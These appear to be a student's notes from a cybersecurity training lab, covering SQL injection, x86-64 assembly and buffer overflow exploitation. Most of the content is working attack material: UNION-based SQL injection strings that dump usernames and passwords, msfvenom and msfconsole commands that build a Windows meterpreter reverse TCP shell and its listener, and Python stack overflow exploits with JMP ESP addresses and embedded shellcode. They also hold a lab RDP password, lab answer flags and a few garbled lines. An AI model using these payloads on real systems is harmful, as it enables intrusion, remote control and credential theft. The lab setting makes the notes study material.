----------------------------------------------------------------------------------------------------
SECURITY DAY 3 MODULE LINKS AND INFO:
STUDENT FG: https://sec.cybbh.io/public/security/latest/lessons/lesson-5-sql_sg.html
STUDENT SLIDES: https://sec.cybbh.io/-/public/-/jobs/842473/artifacts/slides/05-sql-injection-slides.html
WINDOWS OP STATION CMD: xfreerdp /u:student /p:password /dynamic-resolution +clipboard /v:10.50.28.16
----------------------------------------------------------------------------------------------------
GENERAL INFO
Audi' UNION select table_schema,2,table,table_name,column_name,5 FROM information_schema.columns WHERE table_schema='session';#
Audi' UNION select id,2,name,pass,5 from session.user;#
----------------------------------------------------------------------------------------------------
DNLA CATEGORY: http://localhost:41707/cases/productsCategory.php/productsCategory.php?category=1%20OR%201=1
  ANSWER: 6QlhGsZRmakpKbceilSU
ADMIN CREDENTIALS: http://localhost:41707/cases/productsCategory.php?category=2%20UNION%20SELECT%20id,username,password%20FROM%20sqlinjection.members;#
  ANSWER: ChhM9hJq9j1nDAYAdRNY
----------------------------------------------------------------------------------------------------
SECURITY DAY 4 MODULE LINKS AND INFO:
STUDENT FG: https://sec.cybbh.io/public/security/latest/lessons/lesson-6-reverse_sg.html
STUDENT SLIDES: https://sec.cybbh.io/-/public/-/jobs/842473/artifacts/slides/06-reverse-engineering.html
----------------------------------------------------------------------------------------------------
X86_64 Assembly - There are 16 general purpose 64-Bit registers
%rax the first return register
%rbp the base pointer that keeps track of the base of the stack
%rsp the stack pointer that points to the top of the stack
----------------------------------------------------------------------------------------------------
X86_64 Assembly - Common Instruction Pointers
MOV move source to destination
PUSH push source onto stack
POP Pop top of stack to destination
INC Increment source by 1
DEC Decrement source by 1
ADD Add source to destination
SUB Subtract soupythonrce from destination
CMP Compare 2 values by subtracting them and setting the %RFLAGS register. ZeroFlag set means they are the same.
JMP Jump to specified location
JLE Jump if less than or equal
JE Jump if equal
----------------------------------------------------------------------------------------------------
REVERSE ENGINEERING DEMO 1:
main:
  mov rax, 16 #MEANS 16-> RAX
  push rax    #PUSHES SPECIFIED VALUE ONTO THE STACK (16 NOW ON THE STACK)
  jmp mem2    #ESSENTIALLY A FUNCTION CALL TO mem2
mem1
  mov,rax, 0  #ASSIGN rax VALUE OF 0
  ret         #RETURN TO MAIN
mem2:
  pop r8      #POPS SPECIFIED VALUE OFF THE STACK AND ASSIGNS IT TO THE SPECIFIED VARIABLE (R8=16 NOW)
  cmp rax,r8  #COMPARES SPECIFIED VALUES (rax=r8 AS 16=16,THUS RETURNS TRUE)
  je mem1     #ESSENTIALLY A FUNCTION CALL TO mem1
----------------------------------------------------------------------------------------------------
CREATE ADMIN ACCOUNT: ebHwRYOhGk0yyRm51ESj
ELF EXPLOITATION 1: jLifN87T4hxEANsLggHv
----------------------------------------------------------------------------------------------------
msfconsole
use payload/linux/x86/exec
show options
set CMD 'whoami && ip a'
generate -b '\x00' -f python
msfvenom -p linux/x86/exec CMD="whoami && ifconfig' -b 'x00' -f python
----------------------------------------------------------------------------------------------------
REVERSE TCP CONNECTION / SHELL CODE / PAYLOAD GEN (IGNORE TOP LINE) msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.41.179 lport=4444 -b "\x00" -f python
  msfconsole
  use multi/handler
  show options
  set payload windows/meterpreter/reverse_tcp
  set LHOST 0.0.0.0
  set LPORT 4444
  exploit (or run)
----------------------------------------------------------------------------------------------------
#!/usr/bin/python2.7

# Fill UP THE BUFFER
buf = "A" * 62

# EIP REGISTER TO JMP ESP
buf += "\x59\x3b\xde\xf7"

'''
JMP ESP addresses
0xf7de3b59  
0xf7f588ab
0xf7f645fb
0xf7f6460f
0xf7f64aeb
'''
# assisti with encoding NOP SLED
buf +="\x90" * 10
'''
msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
'''
# Shell Code / Payload below
buf += b"\xdb\xd8\xbe\x34\xcb\x24\x47\xd9\x74\x24\xf4\x58"
buf += b"\x31\xc9\xb1\x0e\x31\x70\x19\x83\xe8\xfc\x03\x70"
buf += b"\x15\xd6\x3e\x4e\x4c\x4e\x58\xdd\x34\x06\x77\x81"
buf += b"\x31\x31\xef\x6a\x31\xd5\xf0\x1c\x9a\x47\x98\xb2"
buf += b"\x6d\x64\x08\xa3\x7d\x6a\xad\x33\xeb\x0c\xce\x5c"
buf += b"\x85\xb6\x79\xc4\x79\x10\x5c\x2a\x0d\x34\xcf\x4b"
buf += b"\x9c\xad\x0f\xdb\x0d\xa4\xf1\x2e\x31"

print(buf)
----------------------------------------------------------------------------------------------------
#!/usr/bin/python2.7

import socket

'''
625011AF
625011BB
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.X.X lport=4444 -b "\x00" -f python
'''


buf = "TRUN /.:/" #Exploit
buf += "A" * 2003 #Buffer Offset
buf += "\xa0\x12\x50\x62"  #JMP ESP
buf += "\x90" * 15 #NOP SLED
buf += #SHELLCODE HERE
s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) # Creates IPv4 socket

s.connect(("0.0.0.0",PORTHERE))    #IP and port to connect to
print s.recv(1024)   #print response
s.send(buf)       #sends the variable buf
print s.recv(1024)   #print response
s.close()         #close the connection
----------------------------------------------------------------------------------------------------
